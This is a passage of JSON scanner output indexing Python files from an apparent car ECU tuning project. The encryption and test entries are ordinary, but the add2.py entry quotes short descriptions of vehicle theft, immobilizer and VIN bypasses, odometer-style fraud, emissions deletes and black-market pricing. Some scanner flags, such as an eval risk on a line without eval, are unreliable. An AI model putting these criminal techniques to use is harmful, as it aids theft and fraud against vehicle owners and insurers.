"line": null}, {"type": "import", "module": "MazdaDealerSecurity", "line": null}, {"type": "import", "module": "AdvancedPerformanceManager,", "line": null}, {"type": "import", "module": "IdealGasPhysics,", "line": null}, {"type": "import", "module": "K04Turbocharger,", "line": null}, {"type": "import", "module": "AdvancedCalculations,", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator, ECUResponse, ECUState"}, {"type": "hardware", "line": 15, "hardware": "ECU", "content": "from .database.ecu_database import Mazdaspeed3Database, ECUCalibration"}, {"type": "hardware", "line": 18, "hardware": "ECU", "content": "from .services.dealer_service import MazdaDealerSecurity"}, {"type": "hardware", "line": 27, "hardware": "ECU", "content": "'ECUCalibration',"}, {"type": "hardware", "line": 32, "hardware": "ECU", "content": "'MazdaDealerSecurity',"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["ads"]}
{"file_path": "add18.py", "lines_read": 246, "features_found": [{"type": "function", "name": "__init__", "line": 24}, {"type": "function", "name": "_generate_master_key", "line": 32}, {"type": "function", "name": "_derive_encryption_key", "line": 36}, {"type": "function", "name": "encrypt_calibration_data", "line": 49}, {"type": "function", "name": "decrypt_calibration_data", "line": 77}, {"type": "function", "name": "generate_vehicle_signature", "line": 103}, {"type": "function", "name": "verify_vehicle_signature", "line": 132}, {"type": "function", "name": "protect_ai_model", "line": 163}, {"type": "function", "name": "unprotect_ai_model", "line": 190}, {"type": "function", "name": "secure_communication_channel", "line": 215}, {"type": "import", "module": "cryptography.fernet", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives.kdf.pbkdf2", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives.ciphers", "line": null}, {"type": "import", "module": "cryptography.hazmat.backends", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "hmac", "line": null}, {"type": "import", "module": "secrets", "line": null}, {"type": "import", "module": "Fernet", "line": null}, {"type": "import", "module": "hashes", "line": null}, {"type": "import", "module": "PBKDF2HMAC", "line": null}, {"type": "import", "module": "Cipher,", "line": null}, {"type": "import", "module": "default_backend", "line": null}, {"type": "import", "module": "base64", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "json", "line": null}], "components_found": [{"type": "class", "name": "SecurityManager", "line": 18}, {"type": "class", "name": "SecurityError", "line": 241}], "algorithms": [{"type": "algorithm_function", "line": 36, "content": "def _derive_encryption_key(self, password: str) -> bytes:"}], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 3, "hardware": "ECU", "content": "SECURITY AND ENCRYPTION UTILITIES"}, {"type": "hardware", "line": 18, "hardware": "ECU", "content": "class SecurityManager:"}, {"type": "hardware", "line": 20, "hardware": "ECU", "content": "COMPLETE SECURITY MANAGEMENT FOR TUNING DATA"}, {"type": "hardware", "line": 21, "hardware": "ECU", "content": "Encrypts calibration files, protects AI models, and secures communication"}, {"type": "hardware", "line": 33, "hardware": "ECU", "content": "\"\"\"Generate cryptographically secure master key\"\"\""}, {"type": "hardware", "line": 51, "hardware": "ECU", "content": "Encrypt ECU calibration data for secure storage"}, {"type": "hardware", "line": 75, "hardware": "ECU", "content": "raise SecurityError(f\"Calibration encryption failed: {e}\")"}, {"type": "hardware", "line": 79, "hardware": "ECU", "content": "Decrypt ECU calibration data with integrity verification"}, {"type": "hardware", "line": 93, "hardware": "ECU", "content": "raise SecurityError(\"Data integrity check failed\")"}, {"type": "hardware", "line": 101, "hardware": "ECU", "content": "raise SecurityError(f\"Calibration decryption failed: {e}\")"}, {"type": "hardware", "line": 103, "hardware": "vehicle", "content": "def generate_vehicle_signature(self, vin: str, calibration_id: str) -> str:"}, {"type": "hardware", "line": 105, "hardware": "vehicle", "content": "Generate unique vehicle signature for tuning file validation"}, {"type": "hardware", "line": 106, "hardware": "vehicle", "content": "Prevents tuning files from being used on unauthorized vehicles"}, {"type": "hardware", "line": 130, "hardware": "ECU", "content": "raise SecurityError(f\"Signature generation failed: {e}\")"}, {"type": "hardware", "line": 132, "hardware": "vehicle", "content": "def verify_vehicle_signature(self, signature_data: str, vin: str, calibration_id: str) -> bool:"}, {"type": "hardware", "line": 134, "hardware": "vehicle", "content": "Verify vehicle signature for tuning file authorization"}, {"type": "hardware", "line": 188, "hardware": "ECU", "content": "raise SecurityError(f\"AI model protection failed: {e}\")"}, {"type": "hardware", "line": 213, "hardware": "ECU", "content": "raise SecurityError(f\"AI model unprotection failed: {e}\")"}, {"type": "hardware", "line": 215, "hardware": "ECU", "content": "def secure_communication_channel(self, data: dict, session_key: str) -> str:"}, {"type": "hardware", "line": 217, "hardware": "ECU", "content": "Secure data for transmission over communication channels"}, {"type": "hardware", "line": 230, "hardware": "ECU", "content": "secure_package = {"}, {"type": "hardware", "line": 236, "hardware": "ECU", "content": "return base64.urlsafe_b64encode(json.dumps(secure_package).encode()).decode()"}, {"type": "hardware", "line": 239, "hardware": "ECU", "content": "raise SecurityError(f\"Communication security failed: {e}\")"}, {"type": "hardware", "line": 241, "hardware": "ECU", "content": "class SecurityError(Exception):"}, {"type": "hardware", "line": 242, "hardware": "ECU", "content": "\"\"\"Custom security exception\"\"\""}, {"type": "hardware", "line": 246, "hardware": "ECU", "content": "security_manager = SecurityManager()"}], "security_logic": [{"type": "security_pattern", "line": 3, "pattern": "encrypt", "content": "SECURITY AND ENCRYPTION UTILITIES"}, {"type": "security_pattern", "line": 7, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 11, "pattern": "hash", "content": "from cryptography.hazmat.primitives import hashes"}, {"type": "security_pattern", "line": 13, "pattern": "algorithm", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 13, "pattern": "cipher", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 21, "pattern": "encrypt", "content": "Encrypts calibration files, protects AI models, and secures communication"}, {"type": "security_pattern", "line": 24, "pattern": "key", "content": "def __init__(self, master_key: str = None):"}, {"type": "security_pattern", "line": 25, "pattern": "key", "content": "self.master_key = master_key or self._generate_master_key()"}, {"type": "security_pattern", "line": 26, "pattern": "key", "content": "self.fernet = Fernet(self._derive_encryption_key(self.master_key))"}, {"type": "security_pattern", "line": 26, "pattern": "encrypt", "content": "self.fernet = Fernet(self._derive_encryption_key(self.master_key))"}, {"type": "security_pattern", "line": 29, "pattern": "key", "content": "self.key_derivation_iterations = 100000"}, {"type": "security_pattern", "line": 32, "pattern": "key", "content": "def _generate_master_key(self) -> str:"}, {"type": "security_pattern", "line": 33, "pattern": "key", "content": "\"\"\"Generate cryptographically secure master key\"\"\""}, {"type": "security_pattern", "line": 36, "pattern": "password", "content": "def _derive_encryption_key(self, password: str) -> bytes:"}, {"type": "security_pattern", "line": 36, "pattern": "key", "content": "def _derive_encryption_key(self, password: str) -> bytes:"}, {"type": "security_pattern", "line": 36, "pattern": "encrypt", "content": "def _derive_encryption_key(self, password: str) -> bytes:"}, {"type": "security_pattern", "line": 37, "pattern": "password", "content": "\"\"\"Derive encryption key from password using PBKDF2\"\"\""}, {"type": "security_pattern", "line": 37, "pattern": "key", "content": "\"\"\"Derive encryption key from password using PBKDF2\"\"\""}, {"type": "security_pattern", "line": 37, "pattern": "encrypt", "content": "\"\"\"Derive encryption key from password using PBKDF2\"\"\""}, {"type": "security_pattern", "line": 40, "pattern": "algorithm", "content": "algorithm=hashes.SHA256(),"}, {"type": "security_pattern", "line": 40, "pattern": "hash", "content": "algorithm=hashes.SHA256(),"}, {"type": "security_pattern", "line": 43, "pattern": "key", "content": "iterations=self.key_derivation_iterations,"}, {"type": "security_pattern", "line": 46, "pattern": "password", "content": "key = base64.urlsafe_b64encode(kdf.derive(password.encode()))"}, {"type": "security_pattern", "line": 46, "pattern": "key", "content": "key = base64.urlsafe_b64encode(kdf.derive(password.encode()))"}, {"type": "security_pattern", "line": 47, "pattern": "key", "content": "return key"}, {"type": "security_pattern", "line": 49, "pattern": "encrypt", "content": "def encrypt_calibration_data(self, calibration_data: dict) -> str:"}, {"type": "security_pattern", "line": 51, "pattern": "encrypt", "content": "Encrypt ECU calibration data for secure storage"}, {"type": "security_pattern", "line": 59, "pattern": "encrypt", "content": "encrypted_data = self.fernet.encrypt(data_str.encode())"}, {"type": "security_pattern", "line": 62, "pattern": "hash", "content": "integrity_hash = hashlib.sha256(data_str.encode()).hexdigest()"}, {"type": "security_pattern", "line": 65, "pattern": "encrypt", "content": "encrypted_package = {"}, {"type": "security_pattern", "line": 66, "pattern": "encrypt", "content": "'data': base64.urlsafe_b64encode(encrypted_data).decode(),"}, {"type": "security_pattern", "line": 67, "pattern": "hash", "content": "'integrity_hash': integrity_hash,"}, {"type": "security_pattern", "line": 72, "pattern": "encrypt", "content": "return base64.urlsafe_b64encode(json.dumps(encrypted_package).encode()).decode()"}, {"type": "security_pattern", "line": 75, "pattern": "encrypt", "content": "raise SecurityError(f\"Calibration encryption failed: {e}\")"}, {"type": "security_pattern", "line": 77, "pattern": "encrypt", "content": "def decrypt_calibration_data(self, encrypted_package: str) -> dict:"}, {"type": "security_pattern", "line": 77, "pattern": "decrypt", "content": "def decrypt_calibration_data(self, encrypted_package: str) -> dict:"}, {"type": "security_pattern", "line": 79, "pattern": "decrypt", "content": "Decrypt ECU calibration data with integrity verification"}, {"type": "security_pattern", "line": 83, "pattern": "encrypt", "content": "package_str = base64.urlsafe_b64decode(encrypted_package.encode()).decode()"}, {"type": "security_pattern", "line": 87, "pattern": "encrypt", "content": "encrypted_data = base64.urlsafe_b64decode(package['data'].encode())"}, {"type": "security_pattern", "line": 88, "pattern": "encrypt", "content": "decrypted_data = self.fernet.decrypt(encrypted_data).decode()"}, {"type": "security_pattern", "line": 88, "pattern": "decrypt", "content": "decrypted_data = self.fernet.decrypt(encrypted_data).decode()"}, {"type": "security_pattern", "line": 91, "pattern": "decrypt", "content": "integrity_hash = hashlib.sha256(decrypted_data.encode()).hexdigest()"}, {"type": "security_pattern", "line": 91, "pattern": "hash", "content": "integrity_hash = hashlib.sha256(decrypted_data.encode()).hexdigest()"}, {"type": "security_pattern", "line": 92, "pattern": "hash", "content": "if integrity_hash != package['integrity_hash']:"}, {"type": "security_pattern", "line": 96, "pattern": "decrypt", "content": "calibration_data = json.loads(decrypted_data)"}, {"type": "security_pattern", "line": 101, "pattern": "decrypt", "content": "raise SecurityError(f\"Calibration decryption failed: {e}\")"}, {"type": "security_pattern", "line": 114, "pattern": "key", "content": "self.master_key.encode(),"}, {"type": "security_pattern", "line": 116, "pattern": "hash", "content": "hashlib.sha256"}, {"type": "security_pattern", "line": 134, "pattern": "authorization", "content": "Verify vehicle signature for tuning file authorization"}, {"type": "security_pattern", "line": 153, "pattern": "key", "content": "self.master_key.encode(),"}, {"type": "security_pattern", "line": 155, "pattern": "hash", "content": "hashlib.sha256"}, {"type": "security_pattern", "line": 165, "pattern": "encrypt", "content": "Encrypt AI model files to protect intellectual property"}, {"type": "security_pattern", "line": 172, "pattern": "cipher", "content": "cipher = Cipher("}, {"type": "security_pattern", "line": 173, "pattern": "key", "content": "algorithms.AES(self._derive_encryption_key(self.master_key)[:32]),"}, {"type": "security_pattern", "line": 173, "pattern": "encrypt", "content": "algorithms.AES(self._derive_encryption_key(self.master_key)[:32]),"}, {"type": "security_pattern", "line": 173, "pattern": "algorithm", "content": "algorithms.AES(self._derive_encryption_key(self.master_key)[:32]),"}, {"type": "security_pattern", "line": 177, "pattern": "encrypt", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 177, "pattern": "cipher", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 180, "pattern": "encrypt", "content": "encrypted_model = encryptor.update(model_data) + encryptor.finalize()"}, {"type": "security_pattern", "line": 183, "pattern": "encrypt", "content": "protected_package = iv + encrypted_model"}, {"type": "security_pattern", "line": 192, "pattern": "decrypt", "content": "Decrypt AI model files"}, {"type": "security_pattern", "line": 197, "pattern": "encrypt", "content": "encrypted_model = protected_data[16:]"}, {"type": "security_pattern", "line": 200, "pattern": "cipher", "content": "cipher = Cipher("}, {"type": "security_pattern", "line": 201, "pattern": "key", "content": "algorithms.AES(self._derive_encryption_key(self.master_key)[:32]),"}, {"type": "security_pattern", "line": 201, "pattern": "encrypt", "content": "algorithms.AES(self._derive_encryption_key(self.master_key)[:32]),"}, {"type": "security_pattern", "line": 201, "pattern": "algorithm", "content": "algorithms.AES(self._derive_encryption_key(self.master_key)[:32]),"}, {"type": "security_pattern", "line": 205, "pattern": "decrypt", "content": "decryptor = cipher.decryptor()"}, {"type": "security_pattern", "line": 205, "pattern": "cipher", "content": "decryptor = cipher.decryptor()"}, {"type": "security_pattern", "line": 208, "pattern": "encrypt", "content": "model_data = decryptor.update(encrypted_model) + decryptor.finalize()"}, {"type": "security_pattern", "line": 208, "pattern": "decrypt", "content": "model_data = decryptor.update(encrypted_model) + decryptor.finalize()"}, {"type": "security_pattern", "line": 215, "pattern": "key", "content": "def secure_communication_channel(self, data: dict, session_key: str) -> str:"}, {"type": "security_pattern", "line": 224, "pattern": "key", "content": "session_fernet = Fernet(self._derive_encryption_key(session_key))"}, {"type": "security_pattern", "line": 224, "pattern": "encrypt", "content": "session_fernet = Fernet(self._derive_encryption_key(session_key))"}, {"type": "security_pattern", "line": 227, "pattern": "encrypt", "content": "encrypted_data = session_fernet.encrypt(data_str.encode())"}, {"type": "security_pattern", "line": 231, "pattern": "key", "content": "'session_id': hashlib.sha256(session_key.encode()).hexdigest()[:16],"}, {"type": "security_pattern", "line": 231, "pattern": "hash", "content": "'session_id': hashlib.sha256(session_key.encode()).hexdigest()[:16],"}, {"type": "security_pattern", "line": 232, "pattern": "encrypt", "content": "'data': base64.urlsafe_b64encode(encrypted_data).decode(),"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["ads"]}
{"file_path": "add19.py", "lines_read": 249, "features_found": [{"type": "function", "name": "setUp", "line": 22}, {"type": "function", "name": "test_factory_calibration_loading", "line": 25}, {"type": "function", "name": "test_ignition_map_retrieval", "line": 31}, {"type": "function", "name": "setUp", "line": 40}, {"type": "function", "name": "test_airflow_calculation", "line": 45}, {"type": "function", "name": "test_horsepower_calculation", "line": 51}, {"type": "function", "name": "test_boost_pressure_conversion", "line": 58}, {"type": "function", "name": "setUp", "line": 69}, {"type": "function", "name": "test_real_time_optimization", "line": 72}, {"type": "function", "name": "setUp", "line": 104}, {"type": "function", "name": "test_anti_lag_activation", "line": 109}, {"type": "function", "name": "test_two_step_rev_limiting", "line": 122}, {"type": "function", "name": "test_launch_control_parameters", "line": 135}, {"type": "function", "name": "setUp", "line": 152}, {"type": "function", "name": "test_compressor_operation", "line": 155}, {"type": "function", "name": "test_turbine_efficiency", "line": 165}, {"type": "function", "name": "setUp", "line": 178}, {"type": "function", "name": "test_calibration_encryption", "line": 181}, {"type": "function", "name": "test_vehicle_signature", "line": 198}, {"type": "function", "name": "setUp", "line": 218}, {"type": "function", "name": "test_faster_spool_technique", "line": 221}, {"type": "function", "name": "test_vvt_optimization", "line": 234}, {"type": "import", "module": "app.database.ecu_database", "line": null}, {"type": "import", "module": "app.services.ai_tuner", "line": null}, {"type": "import", "module": "app.services.physics_engine", "line": null}, {"type": "import", "module": "app.services.dealer_service", "line": null}, {"type": "import", "module": "app.services.performance_features", "line": null}, {"type": "import", "module": "app.models.engine_models", "line": null}, {"type": "import", "module": "app.models.turbo_models", "line": null}, {"type": "import", "module": "app.utils.calculations", "line": null}, {"type": "import", "module": "app.utils.security", "line": null}, {"type": "import", "module": "unittest", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "Mazdaspeed3Database,", "line": null}, {"type": "import", "module": "AITuningSystem", "line": null}, {"type": "import", "module": "TurbochargerPhysics,", "line": null}, {"type": "import", "module": "MazdaDealerSecurity", "line": null}, {"type": "import", "module": "AntiLagSystem,", "line": null}, {"type": "import", "module": "IdealGasPhysics,", "line": null}, {"type": "import", "module": "K04Turbocharger", "line": null}, {"type": "import", "module": "AdvancedCalculations,", "line": null}, {"type": "import", "module": "SecurityManager", "line": null}], "components_found": [{"type": "class", "name": "TestECUDatabase", "line": 19}, {"type": "class", "name": "TestPhysicsEngine", "line": 37}, {"type": "class", "name": "TestAITuning", "line": 66}, {"type": "class", "name": "TestPerformanceFeatures", "line": 101}, {"type": "class", "name": "TestTurboModels", "line": 149}, {"type": "class", "name": "TestSecurity", "line": 175}, {"type": "class", "name": "TestTuningSecrets", "line": 215}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 9, "hardware": "ECU", "content": "from app.database.ecu_database import Mazdaspeed3Database, ECUCalibration"}, {"type": "hardware", "line": 12, "hardware": "ECU", "content": "from app.services.dealer_service import MazdaDealerSecurity"}, {"type": "hardware", "line": 17, "hardware": "ECU", "content": "from app.utils.security import SecurityManager"}, {"type": "hardware", "line": 19, "hardware": "ECU", "content": "class TestECUDatabase(unittest.TestCase):"}, {"type": "hardware", "line": 20, "hardware": "ECU", "content": "\"\"\"Test ECU database functionality\"\"\""}, {"type": "hardware", "line": 29, "hardware": "vehicle", "content": "self.assertEqual(calibration.vehicle_model, \"MAZDASPEED3_2011\")"}, {"type": "hardware", "line": 113, "hardware": "vehicle", "content": "vehicle_speed=50.0,"}, {"type": "hardware", "line": 127, "hardware": "vehicle", "content": "vehicle_speed=0.0,"}, {"type": "hardware", "line": 138, "hardware": "vehicle", "content": "vehicle_speed=0.0,"}, {"type": "hardware", "line": 175, "hardware": "ECU", "content": "class TestSecurity(unittest.TestCase):"}, {"type": "hardware", "line": 176, "hardware": "ECU", "content": "\"\"\"Test security and encryption functionality\"\"\""}, {"type": "hardware", "line": 179, "hardware": "ECU", "content": "self.security = SecurityManager(\"test_master_key\")"}, {"type": "hardware", "line": 190, "hardware": "ECU", "content": "encrypted = self.security.encrypt_calibration_data(test_calibration)"}, {"type": "hardware", "line": 195, "hardware": "ECU", "content": "decrypted = self.security.decrypt_calibration_data(encrypted)"}, {"type": "hardware", "line": 198, "hardware": "vehicle", "content": "def test_vehicle_signature(self):"}, {"type": "hardware", "line": 199, "hardware": "vehicle", "content": "\"\"\"Test vehicle signature generation and verification\"\"\""}, {"type": "hardware", "line": 204, "hardware": "ECU", "content": "signature = self.security.generate_vehicle_signature(vin, calibration_id)"}, {"type": "hardware", "line": 204, "hardware": "vehicle", "content": "signature = self.security.generate_vehicle_signature(vin, calibration_id)"}, {"type": "hardware", "line": 208, "hardware": "ECU", "content": "is_valid = self.security.verify_vehicle_signature(signature, vin, calibration_id)"}, {"type": "hardware", "line": 208, "hardware": "vehicle", "content": "is_valid = self.security.verify_vehicle_signature(signature, vin, calibration_id)"}, {"type": "hardware", "line": 212, "hardware": "ECU", "content": "is_invalid = self.security.verify_vehicle_signature(signature, \"WRONGVIN\", calibration_id)"}, {"type": "hardware", "line": 212, "hardware": "vehicle", "content": "is_invalid = self.security.verify_vehicle_signature(signature, \"WRONGVIN\", calibration_id)"}], "security_logic": [{"type": "security_pattern", "line": 176, "pattern": "encrypt", "content": "\"\"\"Test security and encryption functionality\"\"\""}, {"type": "security_pattern", "line": 179, "pattern": "key", "content": "self.security = SecurityManager(\"test_master_key\")"}, {"type": "security_pattern", "line": 181, "pattern": "encrypt", "content": "def test_calibration_encryption(self):"}, {"type": "security_pattern", "line": 182, "pattern": "encrypt", "content": "\"\"\"Test calibration data encryption and decryption\"\"\""}, {"type": "security_pattern", "line": 182, "pattern": "decrypt", "content": "\"\"\"Test calibration data encryption and decryption\"\"\""}, {"type": "security_pattern", "line": 190, "pattern": "encrypt", "content": "encrypted = self.security.encrypt_calibration_data(test_calibration)"}, {"type": "security_pattern", "line": 191, "pattern": "encrypt", "content": "self.assertIsInstance(encrypted, str)"}, {"type": "security_pattern", "line": 192, "pattern": "encrypt", "content": "self.assertGreater(len(encrypted), 0)"}, {"type": "security_pattern", "line": 195, "pattern": "encrypt", "content": "decrypted = self.security.decrypt_calibration_data(encrypted)"}, {"type": "security_pattern", "line": 195, "pattern": "decrypt", "content": "decrypted = self.security.decrypt_calibration_data(encrypted)"}, {"type": "security_pattern", "line": 196, "pattern": "decrypt", "content": "self.assertEqual(decrypted, test_calibration)"}, {"type": "security_pattern", "line": 244, "pattern": "key", "content": "any(key.startswith('vvt_') for key in adjustments.keys())"}], "dead_or_disabled_code": [], "risks": [{"type": "security_risk", "line": 31, "risk": "eval\\(", "content": "def test_ignition_map_retrieval(self):"}], "group_tags": ["ads"]}
{"file_path": "add2.py", "lines_read": 505, "features_found": [{"type": "function", "name": "generate_dark_web_report", "line": 408}, {"type": "function", "name": "__init__", "line": 25}, {"type": "function", "name": "_init_dark_sources", "line": 31}, {"type": "function", "name": "_access_exploit_markets", "line": 55}, {"type": "function", "name": "_criminal_techniques", "line": 79}, {"type": "function", "name": "__init__", "line": 106}, {"type": "function", "name": "_emissions_delete_methods", "line": 111}, {"type": "function", "name": "_insurance_bypass_systems", "line": 139}, {"type": "function", "name": "_anti_tracking_techniques", "line": 161}, {"type": "function", "name": "__init__", "line": 185}, {"type": "function", "name": "_vehicle_theft_systems", "line": 190}, {"type": "function", "name": "_automotive_fraud_methods", "line": 212}, {"type": "function", "name": "_vehicle_cloning_equipment", "line": 233}, {"type": "function", "name": "__init__", "line": 257}, {"type": "function", "name": "_current_zero_days", "line": 262}, {"type": "function", "name": "_firmware_backdoors", "line": 285}, {"type": "function", "name": "_hardware_exploitation", "line": 307}, {"type": "function", "name": "__init__", "line": 332}, {"type": "function", "name": "_current_market_analysis", "line": 337}, {"type": "function", "name": "_illegal_service_pricing", "line": 359}, {"type": "function", "name": "_black_market_supply", "line": 383}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "stem", "line": null}, {"type": "import", "module": "stem.control", "line": null}, {"type": "import", "module": "torch", "line": null}, {"type": "import", "module": "transformers", "line": null}, {"type": "import", "module": "asyncio", "line": null}, {"type": "import", "module": "aiohttp", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "base64", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "random", "line": null}, {"type": "import", "module": "Signal", "line": null}, {"type": "import", "module": "Controller", "line": null}, {"type": "import", "module": "socks", "line": null}, {"type": "import", "module": "socket", "line": null}], "components_found": [{"type": "class", "name": "DarkWebIntelligence", "line": 22}, {"type": "class", "name": "BlackMarketTuning", "line": 103}, {"type": "class", "name": "CriminalEnterpriseTools", "line": 182}, {"type": "class", "name": "AdvancedExploitation", "line": 254}, {"type": "class", "name": "IllegalMarketAnalysis", "line": 329}], "algorithms": [], "protocols": [{"type": "protocol", "line": 83, "protocol": "CAN", "content": "'key_programming': 'CAN bus injection to program new keys',"}, {"type": "protocol", "line": 143, "protocol": "OBD", "content": "'physical_blocker': 'Device that occupies OBD2 port',"}, {"type": "protocol", "line": 289, "protocol": "CAN", "content": "'activation_sequence': 'Specific CAN bus message pattern',"}], "hardware_assumptions": [{"type": "hardware", "line": 37, "hardware": "ECU", "content": "'ecu_hacking_tor.silk',"}, {"type": "hardware", "line": 59, "hardware": "ECU", "content": "'ecu_tuning_vulnerability': '$15,000-$50,000',"}, {"type": "hardware", "line": 62, "hardware": "vehicle", "content": "'warranty_reset_service': '$2,000 per vehicle'"}, {"type": "hardware", "line": 67, "hardware": "vehicle", "content": "'theft_vehicle_reprogramming': '$1,500 complete',"}, {"type": "hardware", "line": 82, "hardware": "vehicle", "content": "'vehicle_theft': {"}, {"type": "hardware", "line": 83, "hardware": "CAN bus", "content": "'key_programming': 'CAN bus injection to program new keys',"}, {"type": "hardware", "line": 84, "hardware": "ECU", "content": "'immobilizer_defeat': 'ECU flash to disable immobilizer',"}, {"type": "hardware", "line": 84, "hardware": "immobilizer", "content": "'immobilizer_defeat': 'ECU flash to disable immobilizer',"}, {"type": "hardware", "line": 90, "hardware": "ECU", "content": "'flash_counter_reset': 'ECU programming counter reset',"}, {"type": "hardware", "line": 96, "hardware": "ECU", "content": "'accident_history_deletion': 'Remove from ECU memory',"}, {"type": "hardware", "line": 97, "hardware": "vehicle", "content": "'theft_staging': 'Make vehicle appear stolen',"}, {"type": "hardware", "line": 115, "hardware": "ECU", "content": "'software_only': 'ECU programming to disable monitoring',"}, {"type": "hardware", "line": 154, "hardware": "TCM", "content": "'tcm_data_modification': 'Alter transmission shift patterns',"}, {"type": "hardware", "line": 155, "hardware": "ECU", "content": "'ecu_data_filtering': 'Remove WOT and high RPM events',"}, {"type": "hardware", "line": 162, "hardware": "vehicle", "content": "\"\"\"VEHICLE TRACKING AND RECOVERY SYSTEM DEFEAT\"\"\""}, {"type": "hardware", "line": 186, "hardware": "vehicle", "content": "self.theft_tools = self._vehicle_theft_systems()"}, {"type": "hardware", "line": 188, "hardware": "vehicle", "content": "self.cloning_tools = self._vehicle_cloning_equipment()"}, {"type": "hardware", "line": 190, "hardware": "vehicle", "content": "def _vehicle_theft_systems(self):"}, {"type": "hardware", "line": 191, "hardware": "vehicle", "content": "\"\"\"PROFESSIONAL VEHICLE THEFT EQUIPMENT\"\"\""}, {"type": "hardware", "line": 194, "hardware": "ECU", "content": "'advanced_scanners': 'Professional diagnostic tools with security bypass',"}, {"type": "hardware", "line": 196, "hardware": "ECU", "content": "'can_bus_injectors': 'Direct ECU communication for key learning',"}, {"type": "hardware", "line": 199, "hardware": "immobilizer", "content": "'immobilizer_defeat': {"}, {"type": "hardware", "line": 200, "hardware": "immobilizer", "content": "'emulator_boxes': 'Simulate immobilizer module communication',"}, {"type": "hardware", "line": 201, "hardware": "ECU", "content": "'ecu_flashing_tools': 'Direct flash to disable security',"}, {"type": "hardware", "line": 202, "hardware": "ECU", "content": "'transponder_simulators': 'Generate valid security codes'"}, {"type": "hardware", "line": 216, "hardware": "vehicle", "content": "'flood_vehicle_repair': 'Electronic damage flag removal',"}, {"type": "hardware", "line": 222, "hardware": "ECU", "content": "'mechanical_failure_induction': 'ECU programming to cause failures',"}, {"type": "hardware", "line": 226, "hardware": "ECU", "content": "'component_aging_reset': 'Reset wear indicators in ECUs',"}, {"type": "hardware", "line": 233, "hardware": "vehicle", "content": "def _vehicle_cloning_equipment(self):"}, {"type": "hardware", "line": 234, "hardware": "vehicle", "content": "\"\"\"VEHICLE IDENTITY CLONING SYSTEMS\"\"\""}, {"type": "hardware", "line": 237, "hardware": "ECU", "content": "'ecu_vin_writers': 'Tools to rewrite VIN in all modules',"}, {"type": "hardware", "line": 239, "hardware": "ECU", "content": "'immobilizer_reprogrammers': 'Match security systems between vehicles'"}, {"type": "hardware", "line": 239, "hardware": "immobilizer", "content": "'immobilizer_reprogrammers': 'Match security systems between vehicles'"}, {"type": "hardware", "line": 239, "hardware": "vehicle", "content": "'immobilizer_reprogrammers': 'Match security systems between vehicles'"}, {"type": "hardware", "line": 267, "hardware": "ECU", "content": "'cellular_backdoor': 'Unsecured diagnostic over LTE',"}, {"type": "hardware", "line": 271, "hardware": "ECU", "content": "'ecu_firmware': {"}, {"type": "hardware", "line": 280, "hardware": "ECU", "content": "'security_seed_prediction': 'Weak random number generation'"}, {"type": "hardware", "line": 289, "hardware": "CAN bus", "content": "'activation_sequence': 'Specific CAN bus message pattern',"}, {"type": "hardware", "line": 290, "hardware": "ECU", "content": "'capabilities': 'Full ECU control without security',"}, {"type": "hardware", "line": 302, "hardware": "ECU", "content": "'denso_ecus': 'Japanese manufacturer special modes'"}, {"type": "hardware", "line": 310, "hardware": "ECU", "content": "'ecu_dumping': {"}, {"type": "hardware", "line": 313, "hardware": "ECU", "content": "'bootloader_override': 'Voltage glitching to bypass security'"}, {"type": "hardware", "line": 316, "hardware": "vehicle", "content": "'bus_hijacking': 'Take control of vehicle networks',"}, {"type": "hardware", "line": 322, "hardware": "ECU", "content": "'oxygen_sensor_simulation': 'Fake AFR data to ECU',"}, {"type": "hardware", "line": 344, "hardware": "vehicle", "content": "'insurance_tracking_defeat': 'High-premium vehicle owners'"}, {"type": "hardware", "line": 347, "hardware": "vehicle", "content": "'electric_vehicle_tuning': 'Battery and motor controller hacking',"}, {"type": "hardware", "line": 349, "hardware": "vehicle", "content": "'vehicle_to_grid_attacks': 'EV charging infrastructure exploitation'"}, {"type": "hardware", "line": 354, "hardware": "ECU", "content": "'prosecution_success_rate': '25% conviction rate currently'"}, {"type": "hardware", "line": 366, "hardware": "vehicle", "content": "'theft_vehicle_reprogramming': '$1,500-$3,000'"}, {"type": "hardware", "line": 370, "hardware": "ECU", "content": "'ecu_programming_tool': '$800-$1,500',"}, {"type": "hardware", "line": 441, "hardware": "ECU", "content": "print(\"WARNING: This information is for educational and security research purposes only.\")"}, {"type": "hardware", "line": 481, "hardware": "ECU", "content": "print(\"SECURITY IMPLICATIONS SUMMARY\")"}, {"type": "hardware", "line": 486, "hardware": "ECU", "content": "1. Factory backdoors in ECU firmware"}, {"type": "hardware", "line": 487, "hardware": "ECU", "content": "2. Weak security algorithms in immobilizer systems"}, {"type": "hardware", "line": 487, "hardware": "immobilizer", "content": "2. Weak security algorithms in immobilizer systems"}, {"type": "hardware", "line": 488, "hardware": "ECU", "content": "3. Unsecured diagnostic protocols over cellular networks"}, {"type": "hardware", "line": 489, "hardware": "ECU", "content": "4. Physical hardware attacks bypassing all software security"}, {"type": "hardware", "line": 492, "hardware": "vehicle", "content": "- Electric vehicle charging infrastructure attacks"}, {"type": "hardware", "line": 494, "hardware": "ECU", "content": "- Vehicle-to-grid security vulnerabilities"}, {"type": "hardware", "line": 494, "hardware": "vehicle", "content": "- Vehicle-to-grid security vulnerabilities"}, 